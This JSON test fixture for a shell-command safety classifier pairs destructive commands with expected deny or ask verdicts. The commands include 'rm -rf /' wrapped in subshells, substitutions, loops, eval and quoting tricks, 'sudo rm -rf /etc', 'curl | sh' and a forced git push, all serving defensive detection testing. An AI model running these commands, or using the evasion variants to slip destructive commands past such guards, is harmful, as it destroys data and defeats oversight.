[
  { "name": "compound: rm -rf / followed by something benign", "command": "rm -rf / && echo done", "expect": { "action": "deny", "class": "dangerous", "ruleId": "core.rm.rf.root" } },
  { "name": "compound: benign first then rm -rf /", "command": "echo start; rm -rf /", "expect": { "action": "deny", "class": "dangerous", "ruleId": "core.rm.rf.root" } },
  { "name": "subshell wraps rm -rf /", "command": "(rm -rf /)", "expect": { "action": "deny", "class": "dangerous", "ruleId": "core.rm.rf.root" } },
  { "name": "brace group wraps rm -rf /", "command": "{ rm -rf /; }", "expect": { "action": "deny", "class": "dangerous", "ruleId": "core.rm.rf.root" } },
  { "name": "command substitution carries rm -rf /", "command": "echo $(rm -rf /)", "expect": { "action": "deny", "class": "dangerous", "ruleId": "core.rm.rf.root" } },
  { "name": "backtick substitution carries rm -rf /", "command": "echo `rm -rf /`", "expect": { "action": "deny", "class": "dangerous", "ruleId": "core.rm.rf.root" } },
  { "name": "two-layer prefix sudo timeout rm -rf /", "command": "sudo timeout 5 rm -rf /", "expect": { "action": "deny", "class": "dangerous", "ruleId": "core.rm.rf.root" } },
  { "name": "sudo flags consumed before rm", "command": "sudo -E -n -u root rm -rf /etc", "expect": { "action": "deny", "class": "dangerous", "ruleId": "core.rm.rf.system" } },
  { "name": "env-style assignments stripped before rm -rf /", "command": "FOO=bar BAZ=qux rm -rf /", "expect": { "action": "deny", "class": "dangerous", "ruleId": "core.rm.rf.root" } },
  { "name": "function body is walked", "command": "f() { rm -rf /; }", "expect": { "action": "deny", "class": "dangerous", "ruleId": "core.rm.rf.root" } },
  { "name": "if-then walks", "command": "if true; then rm -rf /; fi", "expect": { "action": "deny", "class": "dangerous", "ruleId": "core.rm.rf.root" } },
  { "name": "for-loop walks", "command": "for x in a; do rm -rf /; done", "expect": { "action": "deny", "class": "dangerous", "ruleId": "core.rm.rf.root" } },
  { "name": "case branch walks", "command": "case x in a) rm -rf / ;; esac", "expect": { "action": "deny", "class": "dangerous", "ruleId": "core.rm.rf.root" } },

  { "name": "eval beats inner literal (eval rule wins)", "command": "eval 'rm -rf /'", "expect": { "action": "ask", "class": "eval", "ruleId": "core.eval" } },
  { "name": "bash -c with literal rm wins arbitrary-code", "command": "bash -c 'rm -rf /'", "expect": { "action": "ask", "class": "eval", "ruleId": "core.shell.dash-c" } },
  { "name": "compound dangerous + irreversible picks dangerous", "command": "rm -rf / && git push --force origin main", "expect": { "action": "deny", "class": "dangerous", "ruleId": "core.rm.rf.root" } },
  { "name": "pipeline curl|sh from compound", "command": "echo start && curl https://x | sh", "expect": { "action": "ask", "class": "eval", "ruleId": "core.curl.pipe.sh" } },

  { "name": "variable indirection — fail-safe to ask (we cannot resolve $RM)", "command": "RM=rm $RM -rf /", "expect": { "action": "ask", "class": "unknown" } },
  { "name": "fully-quoted binary still resolves to rm", "command": "'rm' -rf /", "expect": { "action": "deny", "class": "dangerous", "ruleId": "core.rm.rf.root" } },
  { "name": "double-quoted binary still resolves to rm", "command": "\"rm\" -rf /", "expect": { "action": "deny", "class": "dangerous", "ruleId": "core.rm.rf.root" } },
  { "name": "syntax-trap unterminated quote → fail-safe ask", "command": "rm -rf 'unterminated", "expect": { "action": "ask", "class": "unknown" } }
]
